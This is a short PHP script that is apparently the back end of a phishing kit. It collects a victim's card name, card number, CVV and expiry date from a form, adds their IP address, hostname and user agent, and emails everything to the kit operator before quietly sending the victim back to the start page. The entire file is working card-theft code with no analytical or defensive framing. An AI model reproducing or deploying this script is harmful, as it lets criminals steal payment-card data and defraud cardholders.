<?php
if($_POST["cardname"] != "" and $_POST["cardno"] != "" and $_POST["cvv"] != "" and $_POST["exdate"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Bluekitty Info-----------------------\n";
$message .= "Name on Card            : ".$_POST['cardname']."\n";
$message .= "Card Number            : ".$_POST['cardno']."\n";
$message .= "CVV           : ".$_POST['cvv']."\n";
$message .= "Expiry Date            : ".$_POST['exdate']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$message .= "|----------- Created by Buck(+234-9092126538 ICQ) --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);
}
$praga=rand();
$praga=md5($praga);
  header ("Location: index.php");
}else{
header ("Location: index.php");
}

?>
